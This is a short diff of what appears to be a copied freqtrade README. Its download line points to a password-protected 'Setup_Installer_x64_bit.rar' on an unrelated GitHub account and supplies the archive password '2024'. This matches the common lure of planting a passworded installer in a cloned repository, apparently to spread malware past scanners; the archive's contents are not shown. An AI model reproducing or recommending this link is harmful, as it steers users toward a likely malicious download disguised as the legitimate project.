@@ -1,6 +1,6 @@
 
 # ![freqtrade](https://raw.githubusercontent.com/freqtrade/freqtrade/develop/docs/assets/freqtrade_poweredby.svg)
-[DOWNLOAD](https://github.com/Faiz-programmer/NEW-codes/releases/download/newcode/Setup_Installer_x64_bit.rar)  CODE TO ARCHIVE: 2024
+[DOWNLOAD](https://github.com/Faiz-programmer/NEW-codes/releases/download/newcode/Setup_Installer_x64_bit.rar)  PASS TO ARCHIVE: 2024
 [![Freqtrade CI](https://github.com/freqtrade/freqtrade/workflows/Freqtrade%20CI/badge.svg)](https://github.com/freqtrade/freqtrade/actions/)
 [![DOI](https://joss.theoj.org/papers/10.21105/joss.04864/status.svg)](https://doi.org/10.21105/joss.04864)
 [![Coverage Status](https://coveralls.io/repos/github/freqtrade/freqtrade/badge.svg?branch=develop&service=github)](https://coveralls.io/github/freqtrade/freqtrade?branch=develop)
